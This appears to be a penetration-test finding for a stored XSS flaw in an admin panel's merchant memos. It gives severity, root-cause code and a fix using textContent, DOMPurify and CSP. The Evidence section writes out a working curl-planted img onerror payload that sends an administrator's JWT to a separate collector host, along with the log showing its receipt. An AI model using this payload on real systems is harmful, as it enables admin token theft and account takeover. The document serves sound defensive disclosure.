# V-13 — Stored XSS in Admin Panel

| Field | Value |
|---|---|
| **Severity** | High (CVSS 7.6) |
| **CWE** | CWE-79 — Cross-Site Scripting |
| **Endpoint** | `POST /api/v1/admin/merchants/:id/memos` (source) / `GET /api/v1/admin/panel` (sink) |
| **Component** | `target-app/src/admin/routes.js` |
| **Status** | Confirmed exploitable |

## Summary
The admin panel renders merchant memos using `innerHTML` without escaping. An attacker can plant a malicious payload in a memo. When an administrator views the panel, the payload executes, allowing the attacker to exfiltrate the administrator's JWT.

## Evidence
1. Plant the payload:
   curl -s -X POST localhost:3000/api/v1/admin/merchants/acme/memos -H "Authorization: Bearer $TOKEN_A" -H 'content-type: application/json' -d '{"content":"<img src=x onerror=\"fetch(\"http://localhost:4000/xss?t=\"+encodeURIComponent(document.getElementById(\"token\").value))\">"}' | jq .

2. Trigger: Admin visits /api/v1/admin/panel, enters their token, and clicks "Load Memos".

3. Exfiltration: The server receives the admin's token in the mock-llm logs:
   mock-llm-1 | GET /xss?t=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...

## Root Cause
The admin/routes.js file renders the memo list client-side using innerHTML:
document.getElementById('memos').innerHTML = data.memos.map(m =>
  '<div class="memo"><strong>' + m.merchant_id + '</strong><p>' + m.content + '</p></div>'
).join('');
The memo content is untrusted and rendered as HTML. (Note: script tags don't execute via innerHTML, which is why img onerror is used).

## Fix
Use textContent instead of innerHTML (or a framework like React that escapes by default). If HTML is required, sanitize with DOMPurify. Additionally, add a strict Content Security Policy (CSP) header to block inline event handlers.
